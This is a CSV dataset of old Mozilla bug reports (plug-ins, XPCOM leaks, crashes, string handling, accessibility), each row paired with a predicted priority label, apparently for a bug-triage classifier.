Issue_id,Component,Title,Description,Status,Resolution,Text,Predicted_Priority
7977,Plug-ins,No wheel scrolling anymore after playing embedded movie.,STR:; ; - Go to http://zaplog.nl/zaplog/article/draadloos_netwerksignalen_laten_je_door_muren_kijken#rss ; - Scroll down and start flash video; - Click Stop and click outside movie; - Attempt to scroll down with mouse wheel; ; Actual result: page doesnt scroll anymore.; ; Regression range:; http://hg.mozilla.org/mozilla-central/pushloghtml?fromchange=8cbc47eee659&tochange=67e02399d88a; ; Maybe caused by Bug 509693 ?,RESOLVED,FIXED,[TITLE] Title: No wheel scrolling anymore after playing embedded movie. | [DESC] Description: STR:; ; - Go to http://zaplog.nl/zaplog/article/draadloos_netwerksignalen_laten_je_door_muren_kijken#rss ; - Scroll down and start flash video; - Click Stop and click outside movie; - Attempt to scroll down with mouse wheel; ; Actual result: page doesnt scroll anymore.; ; Regression range:; http://hg.mozilla.org/mozilla-central/pushloghtml?fromchange=8cbc47eee659&tochange=67e02399d88a; ; Maybe caused by Bug 509693 ? | [META] Component: Plug-ins | [META] Status: RESOLVED | [META] Resolution: FIXED,1
7146,XPCOM,Leaking nsThread and nsTimerImpl running full set of Mochitests,Created attachment 306809; nsTimerImpl and nsThread balance trees; ; python runtests.py --autorun --close-when-done \;   --setenv=XPCOM_MEM_LOG_CLASSES=nsTimerImpl;nsThread \;   --setenv=XPCOM_MEM_REFCNT_LOG=/Users/jwalden/Temp/refcnt-log.txt \;   --leak-threshold=0; ; ...; Serial Numbers of Leaked Objects:; 5988 @0x3c02cb30 (1 references; 0 from COMPtrs); 928 @0x3f9feba0 (1 references; 1 from COMPtrs); ERROR FAIL leaked 132 bytes during test execution (should have leaked no more than 0 bytes); ERROR FAIL leaked 1 instance of nsThread with size 72 bytes; ERROR FAIL leaked 1 instance of nsTimerImpl with size 60 bytes; ; See the attachment for the resulting balance trees.; ; The thread is held alive by the mCallingThread nsCOMPtr in nsTimerImpl; so its not relevant to analysis -- the timer; and I believe particularly the timer thread; is the root problem.  Take a look at the timer tree and the relevant source (particularly for the addrefs/releases from TimerThread::Run; which just pass the timer threads ref to nsTimerEvent); and I think the sequence of events is like so:; ; new timer; master ref in nsRecyclingAllocator (timer at 1 ref total); InitWithFuncCallback gives TimerThread 1 ref to timer (timer at 2 refs total); TimerThread::Run passes its ref to raw pointer (timer at 2 refs total); raw pointer passes its ref to nsTimerEvent (timer at 2 refs total); nsRefPtr takes ref from nsTimerEvent (timer at 2 refs total); TimerThread takes 1 ref to timer via timer::Fire (timer at 3 refs total); nsRefPtr releases 1 ref (timer at 2 refs total); TimerThread::Run passes its ref to raw pointer (timer at 2 refs total); ???; nsRecyclingAllocator releases master ref (timer at 1 ref total); ; It shouldnt be the case that the timers being inserted in TimerThread::mTimers too late; because the fully-cleared assertion in ~TimerThread didnt fire.  I think whats happening is that after the ref gets passed to a raw pointer; we attempt to post an nsTimerEvent but (silently) fail when mCallingThread->Dispatch fails.  However; Im not seeing any of the warnings that I think should happen in this case; so I may be wrong.; ; In any case; I think we have more than enough evidence to figure out whats wrong here and and fix it; and with this fixed we could require (on OS X; no idea about elsewhere) that Mochitests run without refcounted leaks on tinderboxen; which would be huge for preventing leaks from showing up in the future.; ; Bug 418409 and bug 417855 leak the same things and so could be the same as this bug.,RESOLVED,FIXED,[TITLE] Title: Leaking nsThread and nsTimerImpl running full set of Mochitests | [DESC] Description: Created attachment 306809; nsTimerImpl and nsThread balance trees; ; python runtests.py --autorun --close-when-done \;   --setenv=XPCOM_MEM_LOG_CLASSES=nsTimerImpl;nsThread \;   --setenv=XPCOM_MEM_REFCNT_LOG=/Users/jwalden/Temp/refcnt-log.txt \;   --leak-threshold=0; ; ...; Serial Numbers of Leaked Objects:; 5988 @0x3c02cb30 (1 references; 0 from COMPtrs); 928 @0x3f9feba0 (1 references; 1 from COMPtrs); ERROR FAIL leaked 132 bytes during test execution (should have leaked no more than 0 bytes); ERROR FAIL leaked 1 instance of nsThread with size 72 bytes; ERROR FAIL leaked 1 instance of nsTimerImpl with size 60 bytes; ; See the attachment for the resulting balance trees.; ; The thread is held alive by the mCallingThread nsCOMPtr in nsTimerImpl; so its not relevant to analysis -- the timer; and I believe particularly the timer thread; is the root problem.  Take a look at the timer tree and the relevant source (particularly for the addrefs/releases from TimerThread::Run; which just pass the timer threads ref to nsTimerEvent); and I think the sequence of events is like so:; ; new timer; master ref in nsRecyclingAllocator (timer at 1 ref total); InitWithFuncCallback gives TimerThread 1 ref to timer (timer at 2 refs total); TimerThread::Run passes its ref to raw pointer (timer at 2 refs total); raw pointer passes its ref to nsTimerEvent (timer at 2 refs total); nsRefPtr takes ref from nsTimerEvent (timer at 2 refs total); TimerThread takes 1 ref to timer via timer::Fire (timer at 3 refs total); nsRefPtr releases 1 ref (timer at 2 refs total); TimerThread::Run passes its ref to raw pointer (timer at 2 refs total); ???; nsRecyclingAllocator releases master ref (timer at 1 ref total); ; It shouldnt be the case that the timers being inserted in TimerThread::mTimers too late; because the fully-cleared assertion in ~TimerThread didnt fire.  I think whats happening is that after the ref gets passed to a raw pointer; we attempt to post an nsTimerEvent but (silently) fail when mCallingThread->Dispatch fails.  However; Im not seeing any of the warnings that I think should happen in this case; so I may be wrong.; ; In any case; I think we have more than enough evidence to figure out whats wrong here and and fix it; and with this fixed we could require (on OS X; no idea about elsewhere) that Mochitests run without refcounted leaks on tinderboxen; which would be huge for preventing leaks from showing up in the future.; ; Bug 418409 and bug 417855 leak the same things and so could be the same as this bug. | [META] Component: XPCOM | [META] Status: RESOLVED | [META] Resolution: FIXED,1
3221,Plug-ins,realplayer launches seperately and embed player does not appear,used to work earlier; seen on 0612 trunk; ; steps:; 1. Go to http://jazz.mcom.com/users/shrir/publish/page-gen.html; 2. Change any of the values and click on generate page.; Result:; After clicking on generate page RealPlayer opens up externally and does not ; show the plugin embed inside browser window as it used to earlier...,VERIFIED,FIXED,[TITLE] Title: realplayer launches seperately and embed player does not appear | [DESC] Description: used to work earlier; seen on 0612 trunk; ; steps:; 1. Go to http://jazz.mcom.com/users/shrir/publish/page-gen.html; 2. Change any of the values and click on generate page.; Result:; After clicking on generate page RealPlayer opens up externally and does not ; show the plugin embed inside browser window as it used to earlier... | [META] Component: Plug-ins | [META] Status: VERIFIED | [META] Resolution: FIXED,0
5883,Document Navigation,Malformed URIs are badly handled in xul error pages,Malformed URIs (ie; those where NS_NewURI throws) do not get entered in session; history. That means that pressing back goes back one page too far.; ; As an interim solution; I suggest falling back to an alert for those errors.,RESOLVED,FIXED,[TITLE] Title: Malformed URIs are badly handled in xul error pages | [DESC] Description: Malformed URIs (ie; those where NS_NewURI throws) do not get entered in session; history. That means that pressing back goes back one page too far.; ; As an interim solution; I suggest falling back to an alert for those errors. | [META] Component: Document Navigation | [META] Status: RESOLVED | [META] Resolution: FIXED,1
4128,Networking,(nsIURI) nsStandardURL::SetFileName doesnt recalculate mPath,For publishing; I came across this interesting bug.; For publishing we create an nsIURI with an url that doesnt have the file; extension.  The extension is added later.  When the code calls; nsStandardURL::SetFileName to set the name with the extension; everything is; reset except mPath which is left as the path without the extension.  During; publishing; the HTTP put tries to GetPath but it doesnt get the whole path.; ; Regardless; this seems like it could be a pretty serious problem (if someone; SetFileName to  or something less than what was there.; ; I have a fix in my own tree but Im not an expert in this area so Id like some; idea of the right approach (manually fix the mLen for mPath or call some other; method to do the recalculation).,RESOLVED,FIXED,[TITLE] Title: (nsIURI) nsStandardURL::SetFileName doesnt recalculate mPath | [DESC] Description: For publishing; I came across this interesting bug.; For publishing we create an nsIURI with an url that doesnt have the file; extension.  The extension is added later.  When the code calls; nsStandardURL::SetFileName to set the name with the extension; everything is; reset except mPath which is left as the path without the extension.  During; publishing; the HTTP put tries to GetPath but it doesnt get the whole path.; ; Regardless; this seems like it could be a pretty serious problem (if someone; SetFileName to  or something less than what was there.; ; I have a fix in my own tree but Im not an expert in this area so Id like some; idea of the right approach (manually fix the mLen for mPath or call some other; method to do the recalculation). | [META] Component: Networking | [META] Status: RESOLVED | [META] Resolution: FIXED,3
7691,XSLT,Exploitable crash in [@txMozillaXSLTProcessor::TransformToDoc ],Found on security focus; not sure where the original came from. Exploit code at the link iframes a little xml file with an xslt transform that causes a crash reliably on 3.0 branch and trunk (and presumably 1.9.1; didnt test).  Null; but its being called; assuming the worst for the moment.; ; Mac 3.0 crash report: http://crash-stats.mozilla.com/report/index/73cd82a1-6465-4ca2-9467-ef4982090325?p=1,VERIFIED,FIXED,[TITLE] Title: Exploitable crash in [@txMozillaXSLTProcessor::TransformToDoc ] | [DESC] Description: Found on security focus; not sure where the original came from. Exploit code at the link iframes a little xml file with an xslt transform that causes a crash reliably on 3.0 branch and trunk (and presumably 1.9.1; didnt test).  Null; but its being called; assuming the worst for the moment.; ; Mac 3.0 crash report: http://crash-stats.mozilla.com/report/index/73cd82a1-6465-4ca2-9467-ef4982090325?p=1 | [META] Component: XSLT | [META] Status: VERIFIED | [META] Resolution: FIXED,0
4874,XPCOM,nsIStringEnumerator,it would be really great if we had specialized interfaces for arrays of AString; and ACString to avoid nsISupportsAString and nsISupportsACString.  something; like this:; ; interface nsIStringArray : nsISupports; {;   readonly attribute unsigned long length;;   AString getElementAt(in unsigned long index); ;   unsigned long indexOf(in unsigned long startIndex; in ACString element);;   nsIStringEnumerator enumerate();; };; ; interface nsIStringEnumerator : nsISupports; {;   boolean hasMore();;   AString getNext();; };; ; ditto for ACString.  i think it is worthwhile to special case strings since; string arrays are so common.  im not sure that nsIStringEnumerator is the; correct name... wouldnt want to confuse it with iterating over a string; but; nsIStringArrayEnumerator seems wrong since the enumeration need not be of an array.,RESOLVED,FIXED,[TITLE] Title: nsIStringEnumerator | [DESC] Description: it would be really great if we had specialized interfaces for arrays of AString; and ACString to avoid nsISupportsAString and nsISupportsACString.  something; like this:; ; interface nsIStringArray : nsISupports; {;   readonly attribute unsigned long length;;   AString getElementAt(in unsigned long index); ;   unsigned long indexOf(in unsigned long startIndex; in ACString element);;   nsIStringEnumerator enumerate();; };; ; interface nsIStringEnumerator : nsISupports; {;   boolean hasMore();;   AString getNext();; };; ; ditto for ACString.  i think it is worthwhile to special case strings since; string arrays are so common.  im not sure that nsIStringEnumerator is the; correct name... wouldnt want to confuse it with iterating over a string; but; nsIStringArrayEnumerator seems wrong since the enumeration need not be of an array. | [META] Component: XPCOM | [META] Status: RESOLVED | [META] Resolution: FIXED,2
5414,Layout: HTML Frames,[FIX]Crash on page with recursive frames,User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.6b) Gecko/20031208; Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.6b) Gecko/20031208; ; The browser crashes upon visiting:; http://www.urbnet.com/anonymous/main.html; ; ; ; Reproducible: Always; ; Steps to Reproduce:; 1. Visit http://www.urbnet.com/anonymous/main.html in Mozilla 1.6b,RESOLVED,FIXED,[TITLE] Title: [FIX]Crash on page with recursive frames | [DESC] Description: User-Agent:       Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.6b) Gecko/20031208; Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.6b) Gecko/20031208; ; The browser crashes upon visiting:; http://www.urbnet.com/anonymous/main.html; ; ; ; Reproducible: Always; ; Steps to Reproduce:; 1. Visit http://www.urbnet.com/anonymous/main.html in Mozilla 1.6b | [META] Component: Layout: HTML Frames | [META] Status: RESOLVED | [META] Resolution: FIXED,0
4841,Print Preview,print preview on huge page completely broken,steps to reproduce:; 1) load http://www.miva.com/docs/reference.html; 2) wait; wait; wait (the browser shows a small dialog telling that its; preparing the preview); 3) As soon as the preview is ready (99 pages!); theres nothing on the first; page; the second page has some content; then the other pages have a big gray box; overlapping some pages; no text can be seen.; ; => expected result: get on the screen a preview of what will get out of my printer,RESOLVED,WORKSFORME,[TITLE] Title: print preview on huge page completely broken | [DESC] Description: steps to reproduce:; 1) load http://www.miva.com/docs/reference.html; 2) wait; wait; wait (the browser shows a small dialog telling that its; preparing the preview); 3) As soon as the preview is ready (99 pages!); theres nothing on the first; page; the second page has some content; then the other pages have a big gray box; overlapping some pages; no text can be seen.; ; => expected result: get on the screen a preview of what will get out of my printer | [META] Component: Print Preview | [META] Status: RESOLVED | [META] Resolution: WORKSFORME,1
2285,Event Handling,M17 crashes when loading the page with two load event listeners,<HTML>; <HEAD>; <SCRIPT>; window.addEventListener(load;;   function (evt) {;     alert(load 1 listener);;   };;   false; );; ; window.addEventListener(load;;   function (evt) {;     alert(load 2 listener);;   };;   false; );; ; </SCRIPT>; </HEAD>; <BODY>; Kibology; </BODY>; </HTML>; ; The crash occurs after the first alert is closed. It doesnt crash if only one; event listener is registered.,VERIFIED,DUPLICATE,[TITLE] Title: M17 crashes when loading the page with two load event listeners | [DESC] Description: <HTML>; <HEAD>; <SCRIPT>; window.addEventListener(load;;   function (evt) {;     alert(load 1 listener);;   };;   false; );; ; window.addEventListener(load;;   function (evt) {;     alert(load 2 listener);;   };;   false; );; ; </SCRIPT>; </HEAD>; <BODY>; Kibology; </BODY>; </HTML>; ; The crash occurs after the first alert is closed. It doesnt crash if only one; event listener is registered. | [META] Component: Event Handling | [META] Status: VERIFIED | [META] Resolution: DUPLICATE,0
1250,Event Handling,[BLOCKER] backspace in GFX text control crashes on event procesing in the PresShell,To reproduce:; ; Start up apprunner; Click at end of url bar; remove all the text with the backspace key; type in www.weather.com; hit return; while it is loading; click in the urlbar and hit backspace.; ; PresShell::HandleEvent(PresShell * const 0x02ec7754; nsIView * 0x02ecac50;; nsGUIEvent * 0x0012fb94; nsEventStatus & nsEventStatus_eIgnore) line 1877 + 35; bytes; nsView::HandleEvent(nsView * const 0x02ecac50; nsGUIEvent * 0x0012fb94; unsigned; int 8; nsEventStatus & nsEventStatus_eIgnore; int & 0) line 835; nsView::HandleEvent(nsView * const 0x02ec98a0; nsGUIEvent * 0x0012fb94; unsigned; int 8; nsEventStatus & nsEventStatus_eIgnore; int & 0) line 820; nsView::HandleEvent(nsView * const 0x02ec9930; nsGUIEvent * 0x0012fb94; unsigned; int 8; nsEventStatus & nsEventStatus_eIgnore; int & 0) line 820; nsView::HandleEvent(nsView * const 0x02ec7b50; nsGUIEvent * 0x0012fb94; unsigned; int 28; nsEventStatus & nsEventStatus_eIgnore; int & 0) line 820; nsViewManager::DispatchEvent(nsViewManager * const 0x02ec7d70; nsGUIEvent *; 0x0012fb94; nsEventStatus & nsEventStatus_eIgnore) line 1611; HandleEvent(nsGUIEvent * 0x0012fb94) line 67; nsWindow::DispatchEvent(nsWindow * const 0x02ec9764; nsGUIEvent * 0x0012fb94;; nsEventStatus & nsEventStatus_eIgnore) line 498 + 10 bytes; nsWindow::DispatchWindowEvent(nsGUIEvent * 0x0012fb94) line 523; nsWindow::DispatchKeyEvent(unsigned int 131; unsigned short 0; unsigned int 8); line 1973 + 15 bytes; nsWindow::OnChar(unsigned int 8; unsigned int 8; unsigned char 1) line 2270; nsWindow::ProcessMessage(unsigned int 258; unsigned int 8; long 917505; long *; 0x0012fdd4) line 2413 + 52 bytes; nsWindow::WindowProc(HWND__ * 0x00170368; unsigned int 258; unsigned int 8; long; 917505) line 571 + 27 bytes,VERIFIED,FIXED,[TITLE] Title: [BLOCKER] backspace in GFX text control crashes on event procesing in the PresShell | [DESC] Description: To reproduce:; ; Start up apprunner; Click at end of url bar; remove all the text with the backspace key; type in www.weather.com; hit return; while it is loading; click in the urlbar and hit backspace.; ; PresShell::HandleEvent(PresShell * const 0x02ec7754; nsIView * 0x02ecac50;; nsGUIEvent * 0x0012fb94; nsEventStatus & nsEventStatus_eIgnore) line 1877 + 35; bytes; nsView::HandleEvent(nsView * const 0x02ecac50; nsGUIEvent * 0x0012fb94; unsigned; int 8; nsEventStatus & nsEventStatus_eIgnore; int & 0) line 835; nsView::HandleEvent(nsView * const 0x02ec98a0; nsGUIEvent * 0x0012fb94; unsigned; int 8; nsEventStatus & nsEventStatus_eIgnore; int & 0) line 820; nsView::HandleEvent(nsView * const 0x02ec9930; nsGUIEvent * 0x0012fb94; unsigned; int 8; nsEventStatus & nsEventStatus_eIgnore; int & 0) line 820; nsView::HandleEvent(nsView * const 0x02ec7b50; nsGUIEvent * 0x0012fb94; unsigned; int 28; nsEventStatus & nsEventStatus_eIgnore; int & 0) line 820; nsViewManager::DispatchEvent(nsViewManager * const 0x02ec7d70; nsGUIEvent *; 0x0012fb94; nsEventStatus & nsEventStatus_eIgnore) line 1611; HandleEvent(nsGUIEvent * 0x0012fb94) line 67; nsWindow::DispatchEvent(nsWindow * const 0x02ec9764; nsGUIEvent * 0x0012fb94;; nsEventStatus & nsEventStatus_eIgnore) line 498 + 10 bytes; nsWindow::DispatchWindowEvent(nsGUIEvent * 0x0012fb94) line 523; nsWindow::DispatchKeyEvent(unsigned int 131; unsigned short 0; unsigned int 8); line 1973 + 15 bytes; nsWindow::OnChar(unsigned int 8; unsigned int 8; unsigned char 1) line 2270; nsWindow::ProcessMessage(unsigned int 258; unsigned int 8; long 917505; long *; 0x0012fdd4) line 2413 + 52 bytes; nsWindow::WindowProc(HWND__ * 0x00170368; unsigned int 258; unsigned int 8; long; 917505) line 571 + 27 bytes | [META] Component: Event Handling | [META] Status: VERIFIED | [META] Resolution: FIXED,0
6216,JavaScript Engine,eval(...) = ... gives invalid assignment lefthand side as a compile-time error instead of as a runtime error,User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8) Gecko/20051111 Firefox/1.5; Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8) Gecko/20051111 Firefox/1.5; ; This test for DOM compliance is supported by javascript 1.5. ; Shouldnt document.getElementById return true for Firefox 1.5 as well? Firefox 1.5  will even return true for a test on document.all; ; Is this a change in js/DOM/DHTML standard or a very serious bug? Hopefully the latter or a lot of recoding will have to be done! Known to affect Firefox 1.5 on Mac OS X; Windows; Linux (Red Hat 9).; ; Reproducible: Always,VERIFIED,FIXED,[TITLE] Title: eval(...) = ... gives invalid assignment lefthand side as a compile-time error instead of as a runtime error | [DESC] Description: User-Agent:       Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8) Gecko/20051111 Firefox/1.5; Build Identifier: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8) Gecko/20051111 Firefox/1.5; ; This test for DOM compliance is supported by javascript 1.5. ; Shouldnt document.getElementById return true for Firefox 1.5 as well? Firefox 1.5  will even return true for a test on document.all; ; Is this a change in js/DOM/DHTML standard or a very serious bug? Hopefully the latter or a lot of recoding will have to be done! Known to affect Firefox 1.5 on Mac OS X; Windows; Linux (Red Hat 9).; ; Reproducible: Always | [META] Component: JavaScript Engine | [META] Status: VERIFIED | [META] Resolution: FIXED,0
4648,Disability Access APIs,Active Accessibility: dont use name attribute for accessible name,Seemed like a good idea at the time :); ; The name attribute on HTML elements is often not human readable. Its quite; likely not something useful for describing a form control or image; in fact it; could be confusing or misleading. The author is not intending this for front end; use.,RESOLVED,FIXED,[TITLE] Title: Active Accessibility: dont use name attribute for accessible name | [DESC] Description: Seemed like a good idea at the time :); ; The name attribute on HTML elements is often not human readable. Its quite; likely not something useful for describing a form control or image; in fact it; could be confusing or misleading. The author is not intending this for front end; use. | [META] Component: Disability Access APIs | [META] Status: RESOLVED | [META] Resolution: FIXED,1
2927,String,infinite loop: promise passed as base type confuses iterator,I think I might understand whats going on with the string infinite; loop I noticed on Menday.  (It may or may not be a new bug; since the code; may never have been tested until I tested it yesterday after fixing the; bustage caused by the removal of nsLiteralChar.)  This is my; understanding based on reading the code.  gdb isnt actually usable; enough for me to check this in the debugger.; ; But anyway; the problem can be seen if you uncomment (i.e.; comment out; the |#ifdef DEBUG_dbaron|) the |#define CSS_REPORT_PARSE_ERRORS| at the; top of content/html/style/src/nsCSSScanner.h and then load the attached; page.  This should trigger the parser error in nsCSSParser.cpp; line 2354.; This is a call that is basically:; ; ReportUnexpectedToken(sc; tok;;                       NS_LITERAL_STRING(Expected ) +;                       nsLocalString(stopString; 1) +;                       NS_LITERAL_STRING( but found)); ; where the function is defined as:; ; static void ReportUnexpectedToken(nsCSSScanner *sc;;                                   nsCSSToken& tok;;                                   const nsAReadableString& err); {;   nsAutoString error(err + NS_LITERAL_STRING( ));;   /* do other stuff */; }; ; The first line of this function is where I see the infinite loop.  I; think the problem is caused by calling |operator+(nsAString&;; nsAString&)| even though the first of the two arguments is really an; |nsPromiseConcatenation|.  This means the outermost; |nsPromiseConcatenation| passed to the constructor of |nsAutoString|; has its mFragmentIdentifierMask set to 1 rather than to (1<<2).  Then; |copy_string| is called from |nsAString::do_AppendFromReadable| which; is called from the constructor of |nsAutoString| (through about 3 other; functions).  However; once the nsReadableFragment<PRUnichar> indicating; the beginning of the nsReadingIterator<PRUnichar> is advanced to the; second fragment (which is the right fragment of the innermost; |nsPromiseConcatenation|); the outermost |nsPromiseConcatenation|; thinks that fragment is referring to its right fragment.  So when we; try to advance to the third fragment (via a call to; |nsReadingIterator<PRUnichar>::advance| that calls; |nsReadingIterator<PRUnichar>::normalize_forward| which calls; |nsPromiseConcatenation::GetReadableFragment|); the outermost promise; thinks there is no next fragment and returns null and leaves the; iterators fragment pointing to the second fragment.  This means that; the iterators |mPosition| is equal to |mFragment.mEnd| so; |nsReadingIterator<PRUnichar>::size_forward| returns 0; but the; iterators mPosition is still not the the same as the |last| parameter; to |copy_string|; so |copy_string| goes into an infinite loop with the; assertion on line 77 of nsAlgorithm.h.; ; I can see ways to fix this (at the cost of an extra virtual function; call) in |operator+(nsAString&; nsAString&)| for the case when the; left operand to that function is an |nsPromiseConcatenation|.  I; cant see a way to fix it when the right operand is an; |nsPromiseConcatenation|.,RESOLVED,DUPLICATE,[TITLE] Title: infinite loop: promise passed as base type confuses iterator | [DESC] Description: I think I might understand whats going on with the string infinite; loop I noticed on Menday.  (It may or may not be a new bug; since the code; may never have been tested until I tested it yesterday after fixing the; bustage caused by the removal of nsLiteralChar.)  This is my; understanding based on reading the code.  gdb isnt actually usable; enough for me to check this in the debugger.; ; But anyway; the problem can be seen if you uncomment (i.e.; comment out; the |#ifdef DEBUG_dbaron|) the |#define CSS_REPORT_PARSE_ERRORS| at the; top of content/html/style/src/nsCSSScanner.h and then load the attached; page.  This should trigger the parser error in nsCSSParser.cpp; line 2354.; This is a call that is basically:; ; ReportUnexpectedToken(sc; tok;;                       NS_LITERAL_STRING(Expected ) +;                       nsLocalString(stopString; 1) +;                       NS_LITERAL_STRING( but found)); ; where the function is defined as:; ; static void ReportUnexpectedToken(nsCSSScanner *sc;;                                   nsCSSToken& tok;;                                   const nsAReadableString& err); {;   nsAutoString error(err + NS_LITERAL_STRING( ));;   /* do other stuff */; }; ; The first line of this function is where I see the infinite loop.  I; think the problem is caused by calling |operator+(nsAString&;; nsAString&)| even though the first of the two arguments is really an; |nsPromiseConcatenation|.  This means the outermost; |nsPromiseConcatenation| passed to the constructor of |nsAutoString|; has its mFragmentIdentifierMask set to 1 rather than to (1<<2).  Then; |copy_string| is called from |nsAString::do_AppendFromReadable| which; is called from the constructor of |nsAutoString| (through about 3 other; functions).  However; once the nsReadableFragment<PRUnichar> indicating; the beginning of the nsReadingIterator<PRUnichar> is advanced to the; second fragment (which is the right fragment of the innermost; |nsPromiseConcatenation|); the outermost |nsPromiseConcatenation|; thinks that fragment is referring to its right fragment.  So when we; try to advance to the third fragment (via a call to; |nsReadingIterator<PRUnichar>::advance| that calls; |nsReadingIterator<PRUnichar>::normalize_forward| which calls; |nsPromiseConcatenation::GetReadableFragment|); the outermost promise; thinks there is no next fragment and returns null and leaves the; iterators fragment pointing to the second fragment.  This means that; the iterators |mPosition| is equal to |mFragment.mEnd| so; |nsReadingIterator<PRUnichar>::size_forward| returns 0; but the; iterators mPosition is still not the the same as the |last| parameter; to |copy_string|; so |copy_string| goes into an infinite loop with the; assertion on line 77 of nsAlgorithm.h.; ; I can see ways to fix this (at the cost of an extra virtual function; call) in |operator+(nsAString&; nsAString&)| for the case when the; left operand to that function is an |nsPromiseConcatenation|.  I; cant see a way to fix it when the right operand is an; |nsPromiseConcatenation|. | [META] Component: String | [META] Status: RESOLVED | [META] Resolution: DUPLICATE,1
